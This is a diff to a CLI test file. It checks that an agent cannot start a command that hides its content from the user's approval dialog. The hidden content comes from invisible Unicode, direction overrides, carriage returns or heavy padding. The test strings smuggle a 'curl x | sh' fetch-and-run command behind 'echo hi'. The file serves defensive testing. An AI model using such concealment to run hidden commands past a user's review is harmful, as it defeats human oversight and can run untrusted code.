@@ -212,9 +212,14 @@ test("cli: an agent's laki new and laki tab can't start a command of its own (--
   assert.match(long.err, /too long to show the user whole/)
   // nor one with characters you wouldn't see: a direction override (it shows the tail reversed), a zero-width space, a
   // carriage return; a newline is shown, so asked
-  for (const cmd of ['echo hi ‮; hs | lruc', 'echo​ hi', 'echo hi\r; curl x | sh']) {
+  for (const cmd of ['echo hi ‮; hs | lruc', 'echo​ hi', 'echo hi\r; curl x | sh', 'echo hi\u00a0; curl x | sh', 'echo hi\u2800\u2800; curl x | sh', 'echo hi\u3164; curl x | sh', 'echo hi\u115f; curl x | sh', 'echo hi\u3000; curl x | sh']) {
     const hidden = await as('tab', ws.id, '--cmd', cmd)
     assert.match(hidden.err, /characters the user couldn't see/, JSON.stringify(cmd))
+  }
+  // nor padding that pushes its end out of the dialog's sight: blank lines, runs of spaces, many lines
+  for (const cmd of ['echo hi\n\n; curl x | sh', `echo hi ${('x' + ' '.repeat(16)).repeat(70)}; curl x | sh`, Array(21).fill('echo hi').join('\n')]) {
+    const padded = await as('tab', ws.id, '--cmd', cmd)
+    assert.match(padded.err, /too much to show the user whole/, JSON.stringify(cmd))
   }
   assert.equal(app.events.filter(m => m.ev === 'toolAsk' && m.cross === 'cmd' && !m.seen).length, 0)
   app.close()
